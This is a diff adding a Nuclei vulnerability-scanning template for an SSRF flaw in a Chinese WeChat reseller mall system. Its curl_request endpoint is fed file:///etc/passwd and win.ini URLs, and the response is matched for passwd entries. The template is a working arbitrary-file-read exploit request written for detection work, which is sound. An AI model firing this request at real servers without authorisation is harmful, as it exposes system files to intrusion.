@@ -1,0 +1,50 @@
+id: internet-wechat-business-address-ssrf
+info:
+  name: "微商代理商补货商城系统 curl_request接口任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 微商代理商补货商城系统
+  description: |
+    SSRF vulnerability in 微商代理商补货商城系统 through the curl_request API that allows arbitrary file reading.
+variables:
+  r_data_linux:
+    - "file:///etc/passwd"
+    - "file:///c://windows/win.ini"
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /Mobile/User/login.html HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/template/mobile/new/static/assets/js/comm.js"
+  - raw:
+      - |
+        GET /Mobile/address/curl_request?url={{r_data_linux}} HTTP/1.1
+        Host: {{Hostname}}
+    payloads:
+      r_data_linux:
+        - "file:///etc/passwd"
+        - "file:///c://windows/win.ini"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
